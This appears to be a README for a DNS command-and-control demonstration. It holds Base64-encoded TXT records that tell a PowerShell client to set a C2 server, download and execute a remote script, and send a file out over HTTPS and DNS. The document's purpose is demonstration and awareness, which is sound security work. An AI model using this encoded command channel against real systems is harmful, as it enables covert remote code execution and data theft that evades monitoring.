# DNS C2 Demo

This set of scripts will help you to demostrate how easy it is to run C2-traffic thru DNS

The script ***demo-create-txt-records.ps1*** creates Base64 encoded records that can be used as TXT-entries

Something like this:

```
;QUESTION
c2demo.ronnkvist.nu. IN TXT
;ANSWER
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzszO1NldDtjMnNlcnZlci5zb21laGF4eG9yLnh5eg=="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzsxO0dldDtodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcmlyb2ZhbC9ETlMtQzItRGVtby9tYWluL2RlbW8tcmVtb3RlLXNjcmlwdC5wczE="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzsyO1BTO2RlbW8tcmVtb3RlLXNjcmlwdC5wczE="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzs0O2h0dHBzO2RlbW8tcHVzaC1vdXQudHh0"
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzs1O0ROUztkZW1vLXB1c2gtb3V0LnR4dA=="
c2demo.ronnkvist.nu. 3600 IN TXT "cmlybzswO1dyaXRlO1RpbWUgdG8gZG8gc29tZSBDMi1zdHVmZiA7KQ=="
```

Then you have the script ***demo-c2-client.ps1*** that you can run on a Windows client with Powershell and access to a DNS.

The script will use TXT-records to find and download another script, execute it and show how a simple DNS-query would send out the information gathered.

### Example output from Demo C2 Client
![Example Output](./demo-c2-client-output.png?raw=true)
